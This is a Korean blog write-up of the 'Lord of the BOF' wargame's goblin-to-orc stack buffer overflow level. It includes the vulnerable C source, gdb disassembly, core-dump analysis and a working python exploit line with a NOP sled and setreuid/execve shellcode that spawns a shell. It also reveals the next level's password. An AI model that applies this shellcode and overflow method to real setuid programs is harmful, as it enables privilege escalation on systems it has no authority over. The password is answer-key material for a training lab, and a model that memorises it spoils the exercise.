---
title: LOB 4번 goblin -> orc Write-up
date: 2017-9-9 9:35:00
categories: LOB
tags: LOB, goblin, orc, egghunter
---

## LOB 4번

    [goblin@localhost goblin]$ bash2
    [goblin@localhost goblin]$ ls -l
    total 20
    -rwsr-sr-x    1 orc      orc         12567 Feb 26  2010 orc
    -rw-r--r--    1 root     root          505 Mar 29  2010 orc.c
    [goblin@localhost goblin]$ cat orc.c
    /*
            The Lord of the BOF : The Fellowship of the BOF
            - orc
            - egghunter
    */
    
    #include <stdio.h>
    #include <stdlib.h>
    
    extern char **environ;
    
    main(int argc, char *argv[])
    {
            char buffer[40];
            int i;
    
            if(argc < 2){
                    printf("argv error\n");
                    exit(0);
            }
    
            // egghunter
            for(i=0; environ[i]; i++)
                    memset(environ[i], 0, strlen(environ[i]));
    
            if(argv[1][47] != '\xbf')
            {
                    printf("stack is still your friend.\n");
                    exit(0);
            }
    
            strcpy(buffer, argv[1]);
            printf("%s\n", buffer);
    }

###  제약사항
EggHunter란 메모리에서 egg, 즉 특정한 값을 찾는 코드라고 생각하면 된다.
첫줄에 있는 `extern char **environ`은 환경변수에 대한 리스트 포인터이며 바로 뒤에 나오는 `//egghunter`에서 for문을 돌리면서 NULL값이 나올 때까지 값을 모두 0으로 덮어씌운다. 따라서 환경변수를 사용할 수 없는 것이다.

또한 `argv[1][47] != '\xbf'`이 부분에서 전달받은 인자값의 48번째 값이 \xbf가 아닐 경우 프로그램을 끊어 버리므로 덮어쓸때 \xbf로 입력해 주어야 한다.

    [goblin@localhost goblin]$ cp orc orc1
    [goblin@localhost goblin]$ ls
    orc  orc.c  orc1
    [goblin@localhost goblin]$ gdb orc1
    GNU gdb 19991004
    Copyright 1998 Free Software Foundation, Inc.
    GDB is free software, covered by the GNU General Public License, and you are
    welcome to change it and/or distribute copies of it under certain conditions.
    Type "show copying" to see the conditions.
    There is absolutely no warranty for GDB.  Type "show warranty" for details.
    This GDB was configured as "i386-redhat-linux"...
    (gdb) disass main
    Dump of assembler code for function main:
    0x8048500 <main>:       push   %ebp
    0x8048501 <main+1>:     mov    %esp,%ebp
    0x8048503 <main+3>:     sub    $0x2c,%esp
    0x8048506 <main+6>:     cmpl   $0x1,0x8(%ebp)
    0x804850a <main+10>:    jg     0x8048523 <main+35>
    0x804850c <main+12>:    push   $0x8048630
    0x8048511 <main+17>:    call   0x8048410 <printf>
    0x8048516 <main+22>:    add    $0x4,%esp
    0x8048519 <main+25>:    push   $0x0
    0x804851b <main+27>:    call   0x8048420 <exit>
    0x8048520 <main+32>:    add    $0x4,%esp
    0x8048523 <main+35>:    nop
    0x8048524 <main+36>:    movl   $0x0,0xffffffd4(%ebp)
    0x804852b <main+43>:    nop
    0x804852c <main+44>:    lea    0x0(%esi,1),%esi
    0x8048530 <main+48>:    mov    0xffffffd4(%ebp),%eax
    0x8048533 <main+51>:    lea    0x0(,%eax,4),%edx
    0x804853a <main+58>:    mov    0x8049750,%eax
    0x804853f <main+63>:    cmpl   $0x0,(%eax,%edx,1)
    0x8048543 <main+67>:    jne    0x8048547 <main+71>
    0x8048545 <main+69>:    jmp    0x8048587 <main+135>
    0x8048547 <main+71>:    mov    0xffffffd4(%ebp),%eax

40바이트의 버퍼와 4바이트의 정수형 변수를 확보하므로 gdb에서 확인할 수 있듯이 0x2c, 즉 44바이트를 확보하고 있다.
따라서 메모리구조는 아래와 같다.

|buffer(40byte)|i(4byte)|SFP(4byte)|RET(4byte)|

    [goblin@localhost goblin]$ ./orc `python -c 'print "\x90" * 50'`
    stack is still your friend.
    [goblin@localhost goblin]$ ./orc `python -c 'print "\x90"*47 + "\xbf"'`
    ¿
    Segmentation fault

이처럼 `argv[1][47]`, 즉 48번째 값이 `\xbf`가 되어야만 Segmentation Fault가 나온다. \xbf는 레드햇에서 스택의 시작 주소로 RET의 시작값이 \xbf인지 확인하는 것이다.

    printf("%p\n", buffer);
    
이 한줄의 코드는 buffer의 메모리 주소를 출력해주는 코드로, if문 앞에 넣어 주었다.

    [goblin@localhost goblin]$ ./orc1 1234
    0xbffffb40
    stack is still your friend.

이렇게 buffer의 주소가 나오긴 나왔는데 익스플로잇이 잘 안되어서 코어 파일로 주소를 다시 받아봤다.

    [goblin@localhost goblin]$ ./orc1 `python -c 'print "\x90"*44+"\x04\xfa\xff\xbf"+"A"*256+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80"'`
    
    0xbffff9d0
    릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?풞AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1육1?됁돿1육F?
    Illegal instruction (core dumped)

이렇게 코어 파일을 생성한 후 gdb로 분석하면 된다.

    [goblin@localhost goblin]$ gdb -q -c core
    Core was generated by `./orc1 릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱L?풞AAAAAAAAAAAAAAAAAAAAAAA'.
    Program terminated with signal 11, Segmentation fault.
    #0  0xbffffb69 in ?? ()
    (gdb) x/20s $esp
    0xbffff9ff:      "?, 'A' <repeats 199 times>...
    0xbffffac7:      'A' <repeats 57 times>, "1육1?200\211?211?육F?200"
    0xbffffb11:      "??
    0xbffffb15:      ""
    0xbffffb16:      ""

nop sled로 \x90을 256번 반복해주었으니 넉넉하게 RET주소를 0xbffffac7로 잡고 넣어봤다.

    [goblin@localhost goblin]$ ./orc `python -c 'print "\x90"*44+"\xc7\xfa\xff\xbf"+"\x90"*256+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
    릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱혓퓧릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱1육1?됁돿1육F?1픐h//shh/bin됥PS됣1柰
                          ?
    bash$ id
    uid=504(orc) gid=503(goblin) egid=504(orc) groups=503(goblin)
    bash$ my-pass
    euid = 504
    cantata

그리고제발시작할때bash2치고시작하자.